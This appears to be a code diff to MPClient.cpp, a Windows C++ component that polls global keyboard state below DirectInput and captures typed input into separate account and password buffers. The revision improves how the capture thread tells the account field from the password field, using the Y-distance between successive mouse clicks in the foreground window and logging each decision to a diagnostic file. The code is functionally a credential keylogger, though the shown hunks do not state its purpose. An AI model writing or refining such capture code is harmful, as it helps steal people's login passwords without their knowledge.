@@ -1,7 +1,7 @@
 // MPClient.cpp - 客户端侧明文桥接 socket
-// [v37] Mouse click + Tab toggle field. No Ctrl hotkeys, no Y-guessing.
+// [v39] Mouse click switches field by Y-delta; Tab toggles.
 //       键盘: 内核级查询, 绕过 DirectInput
-//       鼠标: 只记日志, 不切换字段(避免窗口大小/分辨率误判)
+//       鼠标: 比较连续两次点击的 Y 坐标差, 判断点在账号框还是密码框
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
@@ -127,10 +127,9 @@ static int      g_capField = 0;             // 当前输入字段: 0=账号 1=�
 static CRITICAL_SECTION g_capCs;            // 保护捕获缓冲区
 static bool     g_capCsReady = false;
 
-// [v38] One-way field switch: first Tab/click -> lock to password. 2nd Tab -> unlock back.
-static LONG     g_lastClickY = -1;          // (reserved)
-static const int CLICK_Y_THRESHOLD = 30;    // (reserved)
-static bool     g_capLocked = false;        // true = field locked after 1st switch
+// [v39] Track previous click Y to detect account->password or password->account switch.
+static LONG     g_lastClickY = -1;          // 上一次鼠标点击的 Y 坐标(客户端坐标)
+static const int CLICK_Y_THRESHOLD = 30;    // 最小 Y 差阈值(px), 低于此值视为同字段点击
 
 // 上一次的按键状态(用于检测边沿: 新按下)
 static BYTE g_prevKeys[256];
@@ -199,22 +198,48 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 
 					// 只处理"新按下"的边沿(避免重复触发)
 					if (nowDown && !wasDown) {
-						// --- [v38] Tab: first press locks to password, 2nd press unlocks back to account ---
-						if (vk == VK_TAB) {
-							EnterCriticalSection(&g_capCs);
-							if (g_capLocked) { g_capField = 0; g_capLocked = false; }
-							else if (g_capField == 0) { g_capField = 1; g_capLocked = true; }
-							LeaveCriticalSection(&g_capCs);
-							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
-							  if (df) { fprintf(df, "[MP-CAP] Tab -> field=%d locked=%d\n", g_capField, (int)g_capLocked); fflush(df); fclose(df); } }
-						}
-					// [v38] Mouse click: first click locks to password. Subsequent clicks ignored while locked.
-					else if (vk == VK_LBUTTON) {
+					// --- [v39] Tab: simple toggle between account and password ---
+					if (vk == VK_TAB) {
 						EnterCriticalSection(&g_capCs);
-						if (!g_capLocked && g_capField == 0) { g_capField = 1; g_capLocked = true; }
+						g_capField = (g_capField == 0) ? 1 : 0;
+						int newField = g_capField;
 						LeaveCriticalSection(&g_capCs);
 						{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
-						  if (df) { fprintf(df, "[MP-CAP] mouse click -> field=%d locked=%d\n", g_capField, (int)g_capLocked); fflush(df); fclose(df); } }
+						  if (df) { fprintf(df, "[MP-CAP] Tab -> field=%d\n", newField); fflush(df); fclose(df); } }
+					}
+					// [v39] Mouse click: switch field by Y-delta from previous click.
+					else if (vk == VK_LBUTTON) {
+						HWND hwnd = GetForegroundWindow();
+						int clickY = -1;
+						int clientH = 0;
+						if (hwnd) {
+							POINT pt;
+							GetCursorPos(&pt);
+							ScreenToClient(hwnd, &pt);
+							RECT rc;
+							GetClientRect(hwnd, &rc);
+							clickY = pt.y;
+							clientH = rc.bottom - rc.top;
+						}
+						EnterCriticalSection(&g_capCs);
+						int newField = g_capField;
+						int loggedDy = 0;
+						if (clientH > 0 && clickY >= 0 && g_lastClickY >= 0) {
+							int threshold = (clientH / 20 > CLICK_Y_THRESHOLD) ? (clientH / 20) : CLICK_Y_THRESHOLD;
+							int dy = clickY - g_lastClickY;
+							loggedDy = dy;
+							if (dy > threshold && g_capField == 0) {
+								g_capField = 1;
+								newField = 1;
+							} else if (dy < -threshold && g_capField == 1) {
+								g_capField = 0;
+								newField = 0;
+							}
+						}
+						if (clickY >= 0) g_lastClickY = clickY;
+						LeaveCriticalSection(&g_capCs);
+						{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+						  if (df) { fprintf(df, "[MP-CAP] mouse click y=%d h=%d dy=%d -> field=%d\n", clickY, clientH, loggedDy, newField); fflush(df); fclose(df); } }
 					}
 						// --- Backspace: 删除末尾字符 ---
 						else if (vk == VK_BACK) {
@@ -281,8 +306,7 @@ void MP_StartCapture() {
 	g_capAccount.clear();
 	g_capPassword.clear();
 	g_capField = 0;
-	g_capLocked = false;
-	g_lastClickY = -1;  // (reserved)
+	g_lastClickY = -1;
 	memset(g_prevKeys, 0, sizeof(g_prevKeys));
 
 	if (InterlockedCompareExchange(&g_captureRunning, 0, 0) == 0) {
@@ -322,7 +346,7 @@ void MP_ClearCred() {
 	g_capAccount.clear();
 	g_capPassword.clear();
 	g_capField = 0;
-	g_capLocked = false;
+	g_lastClickY = -1;
 	LeaveCriticalSection(&g_capCs);
 }
 
